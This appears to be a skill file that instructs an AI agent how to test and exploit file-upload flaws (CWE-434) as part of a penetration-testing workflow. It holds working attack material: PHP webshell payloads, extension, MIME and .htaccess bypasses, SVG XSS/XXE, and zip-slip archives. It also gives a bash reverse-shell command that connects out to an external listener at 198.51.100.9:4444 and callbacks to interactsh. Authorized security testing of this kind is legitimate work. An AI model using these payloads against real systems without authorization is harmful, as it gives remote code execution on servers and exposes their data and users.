---
name: file-upload-testing
description: "Methodology for testing and exploiting unrestricted/malicious file upload (WSTG-BUSL-09, CWE-434) — bypassing extension/MIME/magic-byte validation, planting webshells, .htaccess/web.config tricks, SVG stored-XSS/XXE, zip-slip archives, and upgrading to RCE. Use against any upload surface: avatar, profile image, document import, media library, attachment, CSV/XLSX import, backup restore."
license: Apache-2.0
metadata:
  author: Section9Labs
  wstg: WSTG-BUSL-09
  cwe: CWE-434
---

# File Upload Testing (WSTG-BUSL-09 / CWE-434)

Goal: get a dangerous file past upload validation, reach it at a stored URL, and
turn it into code execution (webshell → reverse shell) or stored XSS/XXE/SSRF.
All work routes through an intercepting proxy (Burp or mitmproxy) — client-side
checks are irrelevant once you edit the raw multipart request.

Every parse/handoff step below ends in a rupu output (work-units array,
`assets.mark`, or `findings.report`). Exact JSON shapes: `references/rupu.md`.

## Phase 1 — Baseline the upload

Before any bypass, learn how the feature behaves with a *legitimate* file.

1. Upload a benign file of the expected type (`avatar.png`, `report.pdf`)
   through the UI with the proxy recording. Capture the raw multipart request:
   field name, filename parameter, `Content-Type` of the part, extra fields
   (CSRF token, upload type, target folder).
2. Find where the file lands:
   - Response body/JSON often returns the stored URL or filename.
   - Check the page that renders it (`<img src=...>`), and `Location` headers.
   - If nothing is returned, guess: `/uploads/`, `/files/`, `/media/`,
     `/static/uploads/`, `/images/`, `/avatars/<userid>/`, date-based dirs
     (`/uploads/2025/11/`). Confirm with ffuf against the filename.
3. Determine how the stored name is derived: kept verbatim? randomized?
   extension preserved? Upload `test.ABC123xyz.png` and see what survives —
   if the extension is preserved verbatim, extension tricks are in play; if
   the whole name is random, you need the response to leak the URL.
4. Determine what is validated and *where*: strip the file input's `accept`
   attr / JS validation (replay via proxy), then send a wrong extension, a
   wrong `Content-Type`, and wrong magic bytes separately. Note which single
   change causes rejection — that tells you which check (extension list,
   MIME header, content sniffing, image re-encode) you must bypass.
5. **rupu**: mark the upload endpoint as an asset:
   `assets.mark kind=web:route depth=crawled`
   coordinates `[{"t":"url","v":"https://192.0.2.10"},{"t":"http_route","v":"/profile/avatar"},{"t":"param","v":"file"}]`,
   and the storage directory as `web:route` depth `mapped`.

## Phase 2 — Generate the test corpus and fan out

Run the generator — it writes every payload file plus a work-units array:

```
python3 scripts/gen_upload_payloads.py --out payloads/ \
  --target https://192.0.2.10/profile/avatar --field file \
  --work-units upload_units.json
```

It produces: PHP/JSP/ASPX webshells under ~12 extension variants
(`shell.php`, `shell.pHp`, `shell.php5`, `shell.phtml`, `shell.phar`,
`shell.pht`, `shell.php.jpg`, trailing-dot, trailing-space, `%00` name),
a GIF89a+PHP polyglot, `.htaccess` + companion `.s9l` shell, `web.config`,
SVG stored-XSS, SVG-XXE, and zip-slip archives (unix + windows entry names).
Each work unit says exactly which filename, part Content-Type, and body to
send, and how to verify success. Hand `upload_units.json` to the
`work-units` skill to normalize/split, then `for_each:` or `dispatch` one
child per variant.

## Phase 3 — Validation bypass loop

Work the variants in this order (cheapest first). Full payload detail and the
decision table for which bypass beats which check: `references/bypasses.md`.

1. **Client-side only**: replay the baseline request with filename
   `shell.php` and PHP body. If accepted, you are done with bypasses.
2. **Extension tricks** (beats blocklist/suffix checks): case (`.pHp`),
   alternates (`.php5 .phtml .phar .pht .phps`, `.jspx .jsw .jsv`,
   `.asp .aspx .ashx .asmx .cer .soap`), double extension (`shell.php.jpg`
   for misconfigured Apache `AddHandler`, `shell.jpg.php` for last-ext
   checks), trailing dot `shell.php.` / space `"shell.php "` (Windows strips
   them), null byte `shell.php%00.jpg` (send a raw 0x00 via Repeater hex
   edit — legacy PHP/path handling).
3. **Content-Type spoofing**: keep the malicious body, set the multipart
   part's `Content-Type: image/jpeg` (or `image/png`). Beats header-only MIME
   checks.
4. **Magic bytes**: prefix the payload with `GIF89a` (or a real PNG/JPEG
   header). Beats `finfo`/libmagic sniffing. Combine with #2 and #3.
5. **Polyglot**: a *valid* image with PHP in EXIF/comment
   (`exiftool -Comment='<?php system($_GET["c"]); ?>' in.jpg`) survives
   content sniffing and some re-encoders; needs an executable extension or
   an `.htaccess` (#6) or LFI include to fire.
6. **`.htaccess` / `web.config` upload**: if the storage dir honors
   per-directory config, upload `.htaccess` with
   `AddType application/x-httpd-php .s9l` then upload `shell.s9l` ("static"
   extension sails past blocklists). IIS: `web.config` can both enable
   handlers and *itself* contain executable ASP. See `references/bypasses.md`.
7. **SVG**: upload `xss.svg` containing `<script>` — stored XSS when served
   inline (`Content-Type: image/svg+xml`, no `Content-Disposition:
   attachment`). SVG with a DOCTYPE external entity probes XXE/SSRF in
   server-side rasterizers — pair with interactsh (`-dns-only` hits count).
8. **Zip-slip**: if the app *extracts* archives (import, theme/plugin
   upload, restore), entries named `../../../../var/www/html/shell.php`
   escape the extraction dir. The generator builds these.
9. **Filename injection**: the filename field itself is input — try path
   traversal in it (`filename="../../shell.php"`), and XSS/SQLi payloads as
   the filename if it's rendered/stored.

After each attempt, record the variant's result. Mark the route
`depth=tested` via `assets.mark` once the corpus has been run.

## Phase 4 — Reach execution

An accepted upload is nothing until you can trigger it. Detail in
`references/exploitation.md`.

1. **Locate**: response-leaked URL first; otherwise brute the candidate dirs
   with ffuf: `ffuf -u https://192.0.2.10/FUZZ/shell.php -w dirs.txt -mc 200,403,500`.
2. **Trigger**: `GET /uploads/shell.php?c=id`. Classify the response:
   - command output (`uid=0...`) → **executing**;
   - raw PHP source → stored but not executed (needs `.htaccess`, rename,
     or LFI include — hand off to the `path-traversal-testing` skill);
   - download headers / image render → served static only (pivot to SVG-XSS
     or zip-slip).
3. **Upgrade**: minimal shell → full reverse shell
   (`?c=bash -c 'bash -i >%26 /dev/tcp/198.51.100.9/4444 0>%261'` with a
   listener up), or write a better shell to disk. Blind exec? verify with
   interactsh: `?c=nslookup <id>.oast.pro`.
4. Non-exec wins: SVG-XSS fires on view (confirm with a canary callback);
   zip-slip confirms by the planted file appearing at the escaped path;
   SVG-XXE confirms via interactsh DNS hit.
5. **ImageTragick / parser vectors** (pointer): if the server *processes*
   images (resize/thumbnail), test CVE-2016-3714-era MVG/MSL payloads and
   malformed inputs against ImageMagick/GraphicsMagick — see
   `references/exploitation.md`.

## Phase 5 — Tools that accelerate this

- **fuxploider** — automated extension/MIME discovery:
  `fuxploider -u https://192.0.2.10/upload --not-regex "forbidden"` probes
  which extensions/techniques the form accepts and attempts templated shells.
  Read its "legitimate extensions" / "vulnerable form" output to seed Phase 3.
- **Burp "Upload Scanner" extension** (BApp) — runs the extension/CT/magic
  matrix plus ImageTragick, PHP/JSP/ASPX modules, SSRF canaries; feed it the
  baseline request from Phase 1.
- **mitmproxy addon** for bulk variants: `mitmdump -s rewrite_upload.py`
  mutating `flow.request.content` filename/CT per request.

## Phase 6 — Report (rupu)

For every confirmed issue, build the finding with:

```
python3 scripts/report_upload_finding.py \
  --url https://192.0.2.10/uploads/shell.php --severity critical \
  --upload-request upload.req --exec-request exec.req --exec-response exec.resp \
  --title "Unrestricted file upload to RCE via double extension" \
  -o finding.json
```

then submit it via the `finding-report` skill / `findings.report` tool:
scope `endpoint`, `target_ref` = executed URL, severity **critical** for code
exec, **high** for webshell-stored-but-blocked or zip-slip write, **medium**
for SVG stored XSS, classification `WSTG-BUSL-09` + `CWE-434`, evidence =
upload request **and** the request/response that proved execution. Mark the
route `depth=exploited`. Shapes in `references/rupu.md`.

## References

- `references/bypasses.md` — full bypass catalog: extensions, MIME, magic
  bytes, polyglots, .htaccess/web.config, SVG, zip-slip, filename injection.
- `references/exploitation.md` — locating stored files, trigger/upgrade
  chains, reverse shells, fuxploider usage, ImageTragick.
- `references/rupu.md` — exact work-unit / assets.mark / findings.report JSON.
